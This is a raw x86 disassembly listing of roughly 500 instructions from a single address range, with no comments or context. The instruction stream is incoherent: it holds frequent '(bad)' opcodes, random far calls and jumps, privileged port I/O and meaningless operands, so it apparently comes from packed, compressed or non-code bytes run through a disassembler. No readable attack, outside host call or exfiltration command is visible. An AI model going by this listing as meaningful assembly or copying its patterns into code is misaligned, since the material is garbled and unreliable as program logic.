  41e231:	dec    eax
  41e232:	ret    
  41e233:	rol    ebp,0x87
  41e236:	in     al,dx
  41e237:	daa    
  41e238:	rcr    BYTE PTR [ecx-0x7e],cl
  41e23b:	mov    bl,0x3a
  41e23d:	in     al,dx
  41e23e:	out    0x5,al
  41e240:	call   FWORD PTR [ebx]
  41e242:	into   
  41e243:	mov    ebx,0x8b0121e0
  41e248:	or     dl,bh
  41e24a:	cmp    eax,0xfaa217ec
  41e24f:	inc    esp
  41e250:	and    al,0x9c
  41e252:	sahf   
  41e253:	into   
  41e254:	fidivr DWORD PTR [ecx]
  41e256:	js     0x41e281
  41e258:	shl    DWORD PTR [edi-0x62],0x5a
  41e25c:	cdq    
  41e25d:	adc    DWORD PTR [eax+0x2b4992c9],edi
  41e263:	xchg   ebp,eax
  41e264:	or     ebx,DWORD PTR [edi]
  41e266:	cmp    eax,0xf9968b3a
  41e26b:	arpl   WORD PTR [esp+esi*1+0xa3c70e2],si
  41e272:	mov    ds:0xaeb31588,al
  41e277:	repnz imul ebp,DWORD PTR [ebx],0x35
  41e27b:	icebp  
  41e27c:	fld    DWORD PTR [edi-0x43]
  41e27f:	test   BYTE PTR [ecx+0x232a833f],0xb0
  41e286:	adc    edx,esp
  41e288:	or     eax,0xa343a489
  41e28d:	test   cl,ch
  41e28f:	mov    al,ds:0xfe1ab93a
  41e294:	mov    esp,0xb6d4c728
  41e299:	int3   
  41e29a:	stc    
  41e29b:	out    0x48,eax
  41e29d:	addr16 mov ah,0x9
  41e2a0:	repz (bad) 
  41e2a2:	and    BYTE PTR [edx+0x27b9ffd4],ch
  41e2a8:	dec    esi
  41e2a9:	(bad)  
  41e2ab:	pop    es
  41e2ac:	das    
  41e2ad:	adc    ch,0x83
  41e2b0:	inc    edi
  41e2b1:	pop    esp
  41e2b2:	push   edx
  41e2b3:	xchg   edx,eax
  41e2b4:	pop    ss
  41e2b5:	dec    ebx
  41e2b6:	outs   dx,DWORD PTR ds:[esi]
  41e2b7:	aad    0x75
  41e2b9:	mov    edi,0xd37dd72
  41e2be:	xchg   edi,eax
  41e2bf:	ins    BYTE PTR es:[edi],dx
  41e2c0:	push   ebx
  41e2c1:	xchg   ecx,eax
  41e2c2:	mov    cl,BYTE PTR [ecx]
  41e2c4:	adc    esi,DWORD PTR [eax+0x39]
  41e2c7:	ins    DWORD PTR es:[edi],dx
  41e2c8:	push   esi
  41e2c9:	adc    bh,BYTE PTR [edi]
  41e2cb:	push   es
  41e2cc:	mov    ds:0x7613e8b1,eax
  41e2d1:	mov    esp,0x28fda8c9
  41e2d6:	pop    esi
  41e2d7:	adc    al,0xa
  41e2d9:	add    eax,0x71a60e11
  41e2de:	call   0x16b7:0xaf8f02b2
  41e2e5:	sar    BYTE PTR [esi],cl
  41e2e7:	jb     0x41e2a7
  41e2e9:	dec    edi
  41e2ea:	(bad)  
  41e2eb:	je     0x41e35c
  41e2ed:	rep lods eax,DWORD PTR ds:[esi]
  41e2ef:	popa   
  41e2f0:	dec    BYTE PTR [esi-0x47b85fff]
  41e2f6:	mov    ds:0xa8a7895a,eax
  41e2fb:	sub    al,0xbe
  41e2fd:	mov    ds:0x3bf104b0,eax
  41e302:	pop    eax
  41e303:	icebp  
  41e304:	call   0xea4:0x9181a957
  41e30b:	pop    ecx
  41e30c:	test   DWORD PTR [edx+0x74],0x26371253
  41e313:	je     0x41e36d
  41e315:	out    0xc9,al
  41e317:	xor    BYTE PTR [ebp+0x305570df],dl
  41e31d:	mov    bl,0xae
  41e31f:	data16 (bad) 
  41e321:	add    DWORD PTR [ebx-0x45],esp
  41e324:	in     al,dx
  41e325:	inc    ebx
  41e326:	jae    0x41e315
  41e328:	test   DWORD PTR [ebx*1-0x1ed1ef75],ebp
  41e32f:	call   DWORD PTR [edi+ecx*8+0x5eaa0a55]
  41e336:	dec    eax
  41e337:	pop    edi
  41e338:	sub    eax,0xaf5819b2
  41e33d:	adc    dl,BYTE PTR [esi+0x1425f66a]
  41e343:	fs xchg ebp,eax
  41e345:	inc    esi
  41e346:	in     eax,dx
  41e347:	push   0xffffffb3
  41e349:	mov    edx,0x40fadfad
  41e34e:	retf   0x66f
  41e351:	leave  
  41e352:	ror    ebx,0xca
  41e355:	mov    esi,0x145b735a
  41e35a:	sub    DWORD PTR [ebp+0x2b1feac7],ebp
  41e360:	dec    esp
  41e361:	scas   al,BYTE PTR es:[edi]
  41e362:	fwait
  41e363:	inc    edx
  41e364:	fisubr DWORD PTR [esi-0x4a]
  41e367:	clc    
  41e368:	xchg   al,bl
  41e36a:	into   
  41e36b:	dec    esp
  41e36c:	mov    dl,bl
  41e36e:	inc    eax
  41e36f:	scas   eax,DWORD PTR es:[edi]
  41e370:	int    0x2d
  41e372:	test   DWORD PTR [edx-0xc],edi
  41e375:	retf   
  41e376:	hlt    
  41e377:	dec    esp
  41e378:	dec    ebx
  41e379:	sub    eax,0xbedad147
  41e37e:	add    esp,esp
  41e380:	repnz inc eax
  41e382:	outs   dx,DWORD PTR ds:[esi]
  41e383:	lock clc 
  41e385:	mov    WORD PTR [ebp+edx*2+0x638aacc4],es
  41e38c:	sub    DWORD PTR [eax-0x26c10cc2],esp
  41e392:	fwait
  41e393:	cli    
  41e394:	daa    
  41e395:	add    ch,BYTE PTR [ebx+0xf]
  41e398:	pop    ss
  41e399:	neg    BYTE PTR [edi+0x68]
  41e39c:	test   bh,bl
  41e39e:	in     eax,0xf8
  41e3a0:	ss pop ebp
  41e3a2:	aas    
  41e3a3:	call   FWORD PTR [esi]
  41e3a5:	test   BYTE PTR [edx+0x556f10],ch
  41e3ab:	inc    ecx
  41e3ac:	mov    ah,0x7c
  41e3ae:	enter  0xfd01,0xa1
  41e3b2:	into   
  41e3b3:	mov    al,0x49
  41e3b5:	sub    dl,bh
  41e3b7:	jmp    0x2b48d4e7
  41e3bc:	out    0x7c,al
  41e3be:	push   eax
  41e3bf:	jne    0x41e380
  41e3c1:	(bad)  
  41e3c3:	test   ebp,edx
  41e3c5:	iret   
  41e3c6:	scas   al,BYTE PTR es:[edi]
  41e3c7:	(bad)  
  41e3c9:	push   edi
  41e3ca:	outs   dx,BYTE PTR ds:[esi]
  41e3cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e3cc:	jno    0x41e3c5
  41e3ce:	jo     0x41e35a
  41e3d0:	dec    ebp
  41e3d1:	or     cl,BYTE PTR [edi+0x160d0574]
  41e3d7:	lea    eax,[eax-0x78]
  41e3da:	ins    BYTE PTR es:[edi],dx
  41e3db:	push   ebx
  41e3dc:	js     0x41e418
  41e3de:	jmp    0x78d9:0x4a95aff8
  41e3e5:	pop    edi
  41e3e6:	mov    fs,WORD PTR [ebx-0x75ab37a0]
  41e3ec:	addr16 dec eax
  41e3ee:	sbb    eax,0x2ae935ce
  41e3f4:	ror    ah,1
  41e3f6:	sbb    al,0x6d
  41e3f8:	sub    BYTE PTR [eax-0x74],dh
  41e3fb:	push   esi
  41e3fc:	jnp    0x41e3fe
  41e3fe:	push   ebp
  41e3ff:	shr    DWORD PTR ds:0xf1f60ef7,1
  41e405:	sub    edx,DWORD PTR [ecx-0x61]
  41e408:	icebp  
  41e409:	adc    eax,0x392ac849
  41e40e:	mov    esi,0x88459f8a
  41e413:	cmp    ebp,0x69bdee3
  41e419:	mov    al,ds:0xdd4555cb
  41e41e:	sub    ecx,ebp
  41e420:	test   eax,0xf3075547
  41e425:	das    
  41e426:	sbb    DWORD PTR [ecx+0x598fb2a8],ebx
  41e42c:	out    dx,al
  41e42d:	inc    edi
  41e42e:	repnz stc 
  41e430:	mov    ecx,0x431ce29
  41e435:	or     dl,ah
  41e437:	ins    DWORD PTR es:[edi],dx
  41e438:	sub    eax,0x36f1b611
  41e43d:	push   ebp
  41e43e:	aaa    
  41e43f:	jl     0x41e469
  41e441:	mov    eax,ds:0x62e59a6a
  41e446:	inc    edx
  41e447:	jg     0x41e42a
  41e449:	(bad)
  41e44d:	push   ebx
  41e44e:	iret   
  41e44f:	push   dx
  41e451:	and    eax,DWORD PTR [ecx-0x24]
  41e454:	call   0x15f7:0x97915148
  41e45b:	(bad)  
  41e45c:	hlt    
  41e45d:	fiadd  WORD PTR [eax+edi*2]
  41e460:	fsubr  QWORD PTR [edi-0x72]
  41e463:	test   al,0xbc
  41e465:	mov    ds:0x7630a7ba,eax
  41e46a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e46b:	cld    
  41e46c:	cmp    bl,BYTE PTR [esi-0x303d408]
  41e472:	out    0x82,eax
  41e474:	retf   
  41e475:	out    dx,al
  41e476:	jg     0x41e4c1
  41e478:	dec    ebx
  41e479:	sbb    edx,eax
  41e47b:	dec    esp
  41e47c:	jno    0x41e41b
  41e47e:	xchg   esp,eax
  41e47f:	pop    es
  41e480:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e481:	and    DWORD PTR [edi+0x37],0xffffff90
  41e485:	fisubr WORD PTR [ecx+0x5b]
  41e488:	scas   eax,DWORD PTR es:[edi]
  41e489:	mov    ah,0x57
  41e48b:	rol    DWORD PTR [ecx],cl
  41e48d:	pop    ecx
  41e48e:	fwait
  41e48f:	adc    eax,DWORD PTR [edx-0x1de611b8]
  41e495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e496:	sar    ebx,cl
  41e498:	stc    
  41e499:	fstp   DWORD PTR [esi-0x40]
  41e49c:	sub    dl,BYTE PTR [ebp-0x79caf7a9]
  41e4a2:	aaa    
  41e4a3:	retf   
  41e4a4:	inc    esp
  41e4a5:	jb     0x41e4ec
  41e4a7:	push   ss
  41e4a8:	dec    ecx
  41e4a9:	(bad)  
  41e4aa:	into   
  41e4ab:	fsub   QWORD PTR [ebp-0x34f90f5a]
  41e4b1:	xchg   ebx,eax
  41e4b2:	cmp    BYTE PTR ds:0xd24f7aae,bl
  41e4b8:	das    
  41e4b9:	(bad)  
  41e4ba:	sbb    ah,BYTE PTR [esi+eiz*1-0x2c]
  41e4be:	fwait
  41e4bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4c0:	dec    esi
  41e4c1:	mov    ds,WORD PTR [eax]
  41e4c3:	cmp    BYTE PTR [edi-0x68],dh
  41e4c6:	cmp    ah,BYTE PTR [ecx]
  41e4c8:	xor    al,BYTE PTR [ebx+0x2c]
  41e4cb:	cmp    DWORD PTR [ecx+0x1a9b0d6c],0xffffffc5
  41e4d2:	pop    ebx
  41e4d3:	pop    edx
  41e4d4:	push   0x49
  41e4d6:	mov    es,WORD PTR [edi]
  41e4d8:	mov    edi,0x1bea81f9
  41e4dd:	sub    ebp,DWORD PTR [ecx+0x5b]
  41e4e0:	cmp    esi,DWORD PTR [edx+0x25]
  41e4e3:	add    al,0xf5
  41e4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e4e6:	sbb    eax,0x763840e0
  41e4eb:	sahf   
  41e4ec:	in     al,0x5a
  41e4ee:	jle    0x41e542
  41e4f0:	or     WORD PTR [edi+ebx*8-0x75150690],sp
  41e4f8:	mov    ecx,0x79156ee0
  41e4fd:	daa    
  41e4fe:	lea    ecx,[ecx-0x2a]
  41e501:	mul    DWORD PTR [eax-0x5921d4dc]
  41e507:	or     al,ah
  41e509:	xor    al,0x1a
  41e50b:	xor    edx,0x7326b494
  41e511:	pop    es
  41e512:	pop    ecx
  41e513:	mov    ss,WORD PTR [edx+0x724c1c59]
  41e519:	push   ds
  41e51a:	jmp    0x41e4b5
  41e51c:	sub    DWORD PTR [ebp-0x6ae61cbc],ebp
  41e522:	push   ebx
  41e523:	fwait
  41e524:	inc    ebp
  41e525:	call   0xc8f3:0xd660fd76
  41e52c:	or     eax,0x7479e854
  41e531:	retf   
  41e532:	adc    esp,DWORD PTR [ebx]
  41e534:	pop    ds
  41e535:	and    BYTE PTR ds:0xb80c51f3,bl
  41e53b:	out    0xad,eax
  41e53d:	xchg   ecx,eax
  41e53e:	shl    BYTE PTR [ebx-0x692662ff],0x1f
  41e545:	ss jl  0x41e543
  41e548:	mov    BYTE PTR [eax-0x63],ah
  41e54b:	js     0x41e5c9
  41e54d:	es mov ebp,0x710fa8f4
  41e553:	test   bh,bh
  41e555:	scas   eax,DWORD PTR es:[edi]
  41e556:	data16 add dh,BYTE PTR [ebp+0xc]
  41e55a:	xor    ecx,DWORD PTR [edi-0x1511f7b1]
  41e560:	mov    dh,0x73
  41e562:	in     eax,dx
  41e563:	aas    
  41e564:	mov    cs,WORD PTR [ebx-0x5c]
  41e567:	(bad)  
  41e568:	jmp    0xfd3f:0xee3cb5e
  41e56f:	bound  esi,QWORD PTR [eax+0x512cf02]
  41e575:	jbe    0x41e52d
  41e577:	mov    BYTE PTR [edi+ebx*1],ah
  41e57a:	push   ds
  41e57b:	xor    al,0x69
  41e57d:	add    ecx,DWORD PTR [edx+0x264581fa]
  41e583:	in     al,0x6
  41e585:	in     eax,0xd5
  41e587:	or     eax,ebx
  41e589:	in     al,dx
  41e58a:	cli    
  41e58b:	xchg   esp,eax
  41e58c:	inc    eax
  41e58d:	add    ah,BYTE PTR [ecx+0x483afb28]
  41e593:	rcr    DWORD PTR [edx+ebx*1+0x4e7baba],1
  41e59a:	fxch   st(4)
  41e59c:	add    DWORD PTR [edx+0x7],esp
  41e59f:	mov    ch,0xfe
  41e5a1:	mov    eax,ds:0xe44ff8fb
  41e5a6:	sbb    edi,ebx
  41e5a8:	xchg   ebx,eax
  41e5a9:	in     al,0x18
  41e5ab:	outs   dx,BYTE PTR ds:[esi]
  41e5ac:	arpl   sp,dx
  41e5ae:	add    DWORD PTR [eax],ebp
  41e5b0:	xor    al,0x62
  41e5b2:	out    dx,al
  41e5b3:	shl    DWORD PTR [edi-0x2b497d4a],1
  41e5b9:	xchg   esi,eax
  41e5ba:	inc    edx
  41e5bb:	sub    DWORD PTR [edx],0x64db844a
  41e5c1:	shl    DWORD PTR [eax+ebp*4+0x7d938992],cl
  41e5c8:	mov    ebp,0xb45c1f04
  41e5cd:	cmp    ax,0x6510
  41e5d1:	dec    edi
  41e5d2:	xchg   ebx,eax
  41e5d3:	inc    ebp
  41e5d4:	popf   
  41e5d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e5d6:	mov    BYTE PTR [edx],al
  41e5d8:	out    0x9a,al
  41e5da:	push   ds
  41e5db:	add    DWORD PTR [edi-0x1],edx
  41e5de:	jns    0x41e5d4
  41e5e0:	mov    edx,DWORD PTR [ebp+0x22]
  41e5e3:	loopne 0x41e5a7
  41e5e5:	data16 cmp al,0x6b
  41e5e8:	mov    eax,ds:0x229a738f
  41e5ed:	dec    eax
  41e5ee:	pop    ss
  41e5ef:	xor    al,0x46
  41e5f1:	jmp    0x8d96:0xcb6eb115
  41e5f8:	mov    ebp,0x4f244bb0
  41e5fd:	mov    eax,0x24a6615
  41e602:	inc    eax
  41e603:	sbb    cl,BYTE PTR [esi]
  41e605:	cmp    al,0xc
  41e607:	aad    0x79
  41e609:	not    DWORD PTR [eax]
  41e60b:	shl    ecx,0xa
  41e60e:	ret    0xc511
  41e611:	push   cs
  41e612:	fmul   DWORD PTR [ecx-0x2bb94143]
  41e618:	mov    WORD PTR [ebp+0x6ea859ce],ds
  41e61e:	xchg   esi,eax
  41e61f:	push   ebx
  41e620:	xchg   esp,eax
  41e621:	add    eax,0x34b24f46
  41e626:	and    BYTE PTR [edx-0x1b7d3cd3],dh
  41e62c:	xchg   ebx,eax
  41e62d:	adc    BYTE PTR [ecx+0x1470e220],ch
  41e633:	scas   al,BYTE PTR es:[edi]
  41e634:	dec    edx
  41e635:	sbb    edi,0xffffffe4
  41e638:	outs   dx,DWORD PTR ds:[esi]
  41e639:	jnp    0x41e5cf
  41e63b:	mov    ds:0x8186338d,al
  41e640:	mov    esp,DWORD PTR [esp+edx*4+0x527850ec]
  41e647:	and    eax,0xe03954dd
  41e64c:	adc    DWORD PTR [esp+ebp*1],0x43cb977e
  41e653:	pop    esi
  41e654:	sahf   
  41e655:	jae    0x41e60d
  41e657:	sub    eax,0x9b66c92a
  41e65c:	mov    esi,0xe720ec29
  41e661:	mov    al,0xb6
  41e663:	test   BYTE PTR [edx+0x25f7d1ab],bl
  41e669:	mov    al,ds:0x848a95b4
  41e66e:	(bad)  
  41e66f:	pusha  
  41e670:	jne    0x41e66c
  41e672:	call   0x90c24178
  41e677:	dec    ecx
  41e678:	dec    edi
  41e679:	(bad)  
  41e67a:	xor    al,0x21
  41e67c:	fnsave [ebp-0xaf519a6]
  41e682:	(bad)  
  41e683:	imul   DWORD PTR [eax+0x14]
  41e686:	movq   mm4,mm3
  41e689:	fidiv  DWORD PTR [ebx]
  41e68b:	(bad)  
  41e68d:	adc    ecx,0xffffff93
  41e690:	inc    esp
  41e691:	adc    DWORD PTR [ebx],esi
  41e693:	add    DWORD PTR [ebx],ebx
  41e695:	(bad)  
  41e696:	fnstenv [esi+eax*8+0x62]
  41e69a:	in     eax,0x6
  41e69c:	and    eax,0x3dd02730
  41e6a1:	call   0x3782:0x528ca760
  41e6a8:	rcl    ebp,1
  41e6aa:	iret   
  41e6ab:	add    DWORD PTR [ecx],0x239acd3e
  41e6b1:	inc    edi
  41e6b2:	xor    eax,0xc508156c
  41e6b7:	cmp    al,0x2b
  41e6b9:	mov    bl,0x7
  41e6bb:	dec    edi
  41e6bc:	jecxz  0x41e72a
  41e6be:	and    ah,dh
  41e6c0:	jecxz  0x41e737
  41e6c2:	in     eax,0xc4
  41e6c4:	(bad)  
  41e6c5:	nop    DWORD PTR [ebx+0x42a11b6a]
  41e6cc:	ja     0x41e66c
  41e6ce:	xchg   esi,eax
  41e6cf:	sub    DWORD PTR [ebp+0xdfd0b2c],eax
  41e6d5:	adc    eax,0xe890a3ad
  41e6da:	sub    eax,0x8fa76b6c
  41e6df:	and    al,0x5e
  41e6e1:	push   ss
  41e6e2:	mov    ch,0xed
  41e6e4:	mov    ebp,0xeccf5585
  41e6e9:	or     BYTE PTR [eax-0x39f645a4],ch
  41e6ef:	loopne 0x41e672
  41e6f1:	(bad)  
  41e6f2:	in     al,0x84
  41e6f4:	mov    ds:0xac9c7c49,eax
  41e6f9:	adc    DWORD PTR [ebp+0x26d7dc02],ebx
  41e6ff:	ror    DWORD PTR [ecx-0x80],cl
  41e702:	pop    ebx
  41e703:	fwait
  41e704:	jns    0x41e762
  41e706:	xchg   esi,eax
  41e707:	loope  0x41e699
  41e709:	or     ecx,DWORD PTR ds:0xe2fef0c3
  41e70f:	pop    edx
  41e710:	std    
  41e711:	repz jo 0x41e742
  41e714:	add    eax,0xaa27f070
  41e719:	scas   eax,DWORD PTR es:[edi]
  41e71a:	retf   
  41e71b:	xor    eax,0x7c7b7baf
  41e720:	pop    eax
  41e721:	fnstenv [eax]
  41e723:	adc    eax,0xd1a2bcdc
  41e728:	mov    bl,0x5a
  41e72a:	push   esi
  41e72b:	mov    gs,WORD PTR [esi]
  41e72d:	mov    ecx,0xad29a15
  41e732:	sbb    eax,0x174f66ec
  41e737:	mov    ebp,ebp
  41e739:	adc    BYTE PTR [eax],ch
  41e73b:	jg     0x41e7b3
  41e73d:	and    eax,0x37ea02d2
  41e742:	jecxz  0x41e6d1
  41e744:	int    0x69
  41e746:	or     BYTE PTR [ebx+0x49],ch
  41e749:	and    al,0xd0
  41e74b:	sub    eax,0x25f847fc
  41e750:	stc    
  41e751:	jbe    0x41e74a
  41e753:	xchg   esi,eax
  41e754:	sub    ecx,esp
  41e756:	adc    eax,0xb773cf07
  41e75b:	push   ss
  41e75c:	pushf  
  41e75d:	and    eax,0xd91a766c
  41e762:	ja     0x41e7e3
  41e764:	lods   eax,DWORD PTR ds:[esi]
  41e765:	jle    0x41e7cc
  41e767:	push   ebx
  41e768:	dec    esp
  41e769:	jmp    0x2826:0x98eb2ebd
  41e770:	std    
  41e771:	add    BYTE PTR [eax+0x5c],al
  41e774:	outs   dx,DWORD PTR ds:[esi]
  41e775:	cwde   
  41e776:	mov    ebp,0x5f7dc3e6
  41e77b:	test   BYTE PTR [ecx],bh
  41e77d:	retfw  0x7472
  41e781:	xchg   edi,eax
  41e782:	push   ss
  41e783:	ins    BYTE PTR es:[edi],dx
  41e784:	mov    dh,0x68
  41e786:	add    al,0xc5
  41e788:	adc    BYTE PTR [ebp-0x193cb83d],al
  41e78e:	or     edi,DWORD PTR [ecx+0x7ab24ebc]
  41e794:	cmp    ecx,ecx
  41e796:	rol    DWORD PTR [eax],0x6f
  41e799:	in     eax,0x6d
  41e79b:	retf   
  41e79c:	and    DWORD PTR [ecx-0x76],esi
  41e79f:	cmp    al,bh
  41e7a1:	ret    0x3fbf
  41e7a4:	inc    eax
  41e7a5:	(bad)  
  41e7a7:	(bad)  
  41e7a8:	mov    esp,0x86d4ac05
  41e7ad:	sar    BYTE PTR [ecx],cl
  41e7af:	pusha  
  41e7b0:	sbb    BYTE PTR [ecx-0x7f80e05b],ch
  41e7b6:	in     al,0x70
  41e7b8:	pop    es
  41e7b9:	or     ch,BYTE PTR [eax-0x2b]
  41e7bc:	add    DWORD PTR [ebx],0xc46accf6
  41e7c2:	(bad)  [edx]
  41e7c4:	mov    eax,ebx
  41e7c6:	js     0x41e79e
  41e7c8:	mov    cl,0xbf
  41e7ca:	mov    bl,0x72
  41e7cc:	sub    BYTE PTR [ecx+edi*8-0x15],al
  41e7d0:	call   0xf949557e
  41e7d5:	out    0xc0,al
  41e7d7:	repnz pop ds
  41e7d9:	retf   
  41e7da:	inc    edx
  41e7db:	(bad)  
  41e7dc:	jge    0x41e80e
  41e7de:	mov    DWORD PTR [ebp-0x36650d41],ebx
  41e7e4:	(bad)  
  41e7e5:	inc    DWORD PTR [ebp+0x4a]
  41e7e8:	fild   DWORD PTR [eax-0xb010c91]
  41e7ee:	push   eax
  41e7ef:	in     eax,0x38
  41e7f1:	sub    DWORD PTR [ecx],ebx
  41e7f3:	add    BYTE PTR [edx],ah
  41e7f5:	mov    dh,dh
  41e7f7:	ret    
  41e7f8:	sub    ch,dl
  41e7fa:	fdivp  st(5),st
  41e7fc:	push   esi
  41e7fd:	sub    BYTE PTR [ebp-0x27635ae0],cl
  41e803:	cwde   
  41e804:	or     eax,0xdba6c556
  41e809:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e80a:	call   0xbf78:0xb5eac60a
  41e811:	call   0xaac74eae
  41e816:	xor    al,0x93
  41e818:	mov    WORD PTR [esi+0x5d],ss
  41e81b:	pop    edi
  41e81c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e81d:	fldenv [edi+0x77d8d15d]
  41e823:	ret    
  41e824:	ja     0x41e868
  41e826:	sbb    DWORD PTR [ebx-0x1bc2aa8b],0x71c287db
  41e830:	cdq    
  41e831:	sub    DWORD PTR [ecx+0x5b],esp
  41e834:	pop    esp
  41e835:	test   WORD PTR cs:[ebx],bx
  41e839:	push   eax
  41e83a:	nop
  41e83b:	pop    es
  41e83c:	mov    ebx,0x6235058b
  41e841:	pusha  
  41e842:	retf   0xd5ae
  41e845:	xchg   edx,eax
  41e846:	xchg   ebx,eax
  41e847:	dec    ebp
  41e848:	push   esp
  41e849:	fld    TBYTE PTR [ebp-0x4a8aeb27]
  41e84f:	mov    edi,0xda3acdae
  41e854:	imul   esi,DWORD PTR [edi-0x5c1f2ff],0x4f14b79
  41e85e:	inc    edi
  41e85f:	add    BYTE PTR [esi-0x22e9eef2],bh
  41e865:	inc    edx
  41e866:	aas    
  41e867:	mov    dl,dh
  41e869:	pop    esi
  41e86a:	shl    al,1
  41e86c:	pushf  
  41e86d:	sar    BYTE PTR [edi+0x50],1
  41e870:	ret    
  41e871:	xchg   edi,eax
  41e872:	xor    ecx,DWORD PTR [ebx-0x6fba71e6]
  41e878:	mov    edi,0x88bd1999
  41e87d:	cmc    
  41e87e:	sbb    edx,DWORD PTR [eax]
  41e880:	xchg   ebx,eax
  41e881:	jo     0x41e849
  41e883:	add    ch,BYTE PTR [ebx]
  41e885:	jmp    0x31aa:0x382d8f1d
  41e88c:	push   ecx
  41e88d:	jae    0x41e82b
  41e88f:	sahf   
  41e890:	cld    
  41e891:	jmp    0xdd183579
  41e896:	jl     0x41e8be
  41e898:	fs push ebp
  41e89a:	mov    eax,ds:0xad5995ec
  41e89f:	dec    ebx
  41e8a0:	push   ecx
  41e8a1:	pop    es
  41e8a2:	scas   eax,DWORD PTR es:[edi]
  41e8a3:	mov    bh,0x1a
  41e8a5:	xchg   edx,eax
  41e8a6:	fadd   DWORD PTR ds:0x78d58641
  41e8ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8ad:	(bad)  
  41e8af:	cmp    eax,edx
  41e8b1:	(bad)  
  41e8b2:	jecxz  0x41e8d7
  41e8b4:	dec    esi
  41e8b5:	cmp    BYTE PTR [ecx+0x35d16720],0xf4
  41e8bc:	mov    edx,0x154109b9
  41e8c1:	arpl   ax,si
  41e8c3:	mov    eax,ds:0x4d9108f2
  41e8c8:	(bad)  
  41e8ca:	pop    edx
  41e8cb:	xchg   esi,eax
  41e8cc:	adc    ebp,DWORD PTR [ebx]
  41e8ce:	inc    ebx
  41e8cf:	fsub   QWORD PTR [ebx+0x4938ca39]
  41e8d5:	or     esi,eax
  41e8d7:	pop    es
  41e8d8:	call   0x3c91acc1
  41e8dd:	and    BYTE PTR [edi-0x45613c8a],dl
  41e8e3:	(bad)  
  41e8e4:	outs   dx,BYTE PTR ds:[esi]
  41e8e5:	or     BYTE PTR [esi],0xf1
  41e8e8:	adc    DWORD PTR [edi-0x5315ee3a],edx
  41e8ee:	mov    WORD PTR [edi-0x541c4998],fs
  41e8f4:	arpl   WORD PTR [ebp+esi*1+0x62a1c83b],sp
  41e8fb:	mov    ch,0xc5
  41e8fd:	stos   DWORD PTR es:[edi],eax
  41e8fe:	mov    esi,DWORD PTR [ebp-0x66]
  41e901:	lods   eax,DWORD PTR ds:[esi]
  41e902:	dec    ebx
  41e903:	dec    ebp
  41e904:	jg     0x41e94e
  41e906:	cmp    ah,al
  41e908:	(bad)  
  41e909:	adc    ecx,ebp
  41e90b:	(bad)  
  41e90d:	lock mov DWORD PTR [ebx+0x33c69fe1],ecx
  41e914:	rcl    edi,cl
  41e916:	test   ecx,eax
  41e918:	sub    al,ch
  41e91a:	sbb    eax,0x4488eb3d
  41e91f:	fdivp  st(2),st
  41e921:	pop    ebp
  41e922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e923:	add    dl,BYTE PTR [eax+0x404d86f9]
  41e929:	xchg   esi,eax
  41e92a:	in     eax,dx
  41e92b:	stos   BYTE PTR es:[edi],al
  41e92c:	sbb    al,0x67
  41e92e:	in     al,0x95
  41e930:	mov    DWORD PTR [edx-0x74],esi
  41e933:	lods   ax,WORD PTR ds:[esi]
  41e935:	mov    edi,edx
  41e937:	retf   0x401a
  41e93a:	push   cs
  41e93b:	pop    ebp
  41e93c:	je     0x41e8c6
  41e93e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e93f:	scas   eax,DWORD PTR es:[edi]
  41e940:	out    dx,eax
  41e941:	xlat   BYTE PTR ds:[ebx]
  41e942:	push   ebp
  41e943:	push   edx
  41e944:	out    dx,eax
  41e945:	out    0x3c,al
  41e947:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e948:	outs   dx,BYTE PTR ds:[esi]
  41e949:	xor    dh,BYTE PTR [eax+eax*2+0x4f]
  41e94d:	rcl    BYTE PTR [ebx+esi*4+0x68],1
  41e951:	cmp    bl,bh
  41e953:	(bad)  
  41e954:	or     cl,BYTE PTR [edx]
  41e956:	bound  ebp,QWORD PTR [edi+0x7f5c86be]
  41e95c:	pop    ecx
  41e95d:	pop    edi
  41e95e:	scas   al,BYTE PTR es:[edi]
  41e95f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e960:	nop
  41e961:	and    BYTE PTR [eax],0x8d
  41e964:	xchg   edi,eax
  41e965:	fidiv  DWORD PTR [edi*2-0x2e8fa4c6]
  41e96c:	or     al,0x75
  41e96e:	idiv   BYTE PTR [esi]
  41e970:	sbb    DWORD PTR [eax-0x3abe8f71],eax
  41e976:	daa    
  41e977:	hlt    
  41e978:	mov    esp,0xe677df6c
  41e97d:	adc    DWORD PTR [edx+0x3e72da64],0xc43d271
  41e987:	cld    
  41e988:	sub    eax,0xc150e8ad
  41e98d:	stos   DWORD PTR es:[edi],eax
  41e98e:	enter  0x4e01,0xbc
  41e992:	scas   eax,DWORD PTR es:[edi]
  41e993:	cmp    eax,edx
  41e995:	inc    edi
  41e996:	int3   
  41e997:	jl     0x41e97d
  41e999:	mov    al,ds:0xc2c061
  41e99e:	mov    ds:0x9df24847,al
  41e9a3:	test   eax,0xae922f2b
  41e9a8:	lods   al,BYTE PTR ds:[esi]
  41e9a9:	fwait
  41e9aa:	out    0x56,eax
  41e9ac:	jl     0x41ea15
  41e9ae:	xchg   esi,eax
  41e9af:	ja     0x41e9cf
  41e9b1:	popf   
  41e9b2:	mov    WORD PTR [ecx-0x5b984377],?
  41e9b8:	imul   ecx,DWORD PTR [esi+0x1f],0x3a
  41e9bc:	jno    0x41e9ca
  41e9be:	mov    edx,0x173965b7
  41e9c3:	imul   esi,DWORD PTR [ebx],0x5fbf41f8
  41e9c9:	rcl    DWORD PTR [esp+edx*8-0xe49746b],1
  41e9d0:	mov    DWORD PTR [edi+0x7ac05790],edx
  41e9d6:	xor    esi,DWORD PTR [ecx+0x4]
  41e9d9:	js     0x41e9c4
  41e9db:	arpl   ax,si
  41e9dd:	xchg   DWORD PTR [esi-0x1ec589b3],ecx
  41e9e3:	jb     0x41ea44
  41e9e5:	xor    BYTE PTR [edx],al
